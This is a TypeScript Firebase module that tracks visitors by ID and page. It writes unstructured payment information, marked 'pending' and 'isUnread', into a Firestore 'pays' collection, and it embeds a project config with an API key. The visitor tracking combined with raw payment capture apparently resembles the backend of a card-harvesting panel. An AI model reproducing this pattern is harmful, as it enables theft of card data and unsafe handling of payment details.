import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc, serverTimestamp } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBjTCVo2TNExzyIeD01ba1tQOWFsKyundI",
  authDomain: "tnmds-e8898.firebaseapp.com",
  projectId: "tnmds-e8898",
  storageBucket: "tnmds-e8898.firebasestorage.app",
  messagingSenderId: "1092251810695",
  appId: "1:1092251810695:web:ab35eea0a3061d20d3f122",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function getData(id: string) {
  try {
    const { getDoc, doc } = await import("firebase/firestore");
    const docRef = doc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error("Error getting document: ", e);
    return null;
  }
}

export async function saveToHistory(visitorID: string, step: number) {
  try {
    const currentData = await getData(visitorID);

    if (!currentData) {
      console.log("No current data to save to history");
      return;
    }

    const { history, ...dataToSave } = currentData;

    const historyEntry = {
      timestamp: new Date().toISOString(),
      step: step,
      data: dataToSave,
    };

    const existingHistory = currentData.history || [];
    const updatedHistory = [...existingHistory, historyEntry];

    await addData({
      id: visitorID,
      history: updatedHistory,
    });

    console.log("Saved to history:", historyEntry);
  } catch (e) {
    console.error("Error saving to history: ", e);
  }
}

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = doc(db, "pays", data.id!);

    // Check if doc already exists to preserve createdAt
    const { getDoc } = await import("firebase/firestore");
    const existing = await getDoc(docRef);

    const payload: any = {
      ...data,
      updatedAt: new Date().toISOString(),
      isUnread: true,
    };

    // Only set createdAt on first creation
    if (!existing.exists()) {
      payload.createdAt = new Date().toISOString();
    }

    await setDoc(docRef, payload, { merge: true });

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  addData({ id: visitorId, currentPage: page });
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};

export { db, database, doc, setDoc };
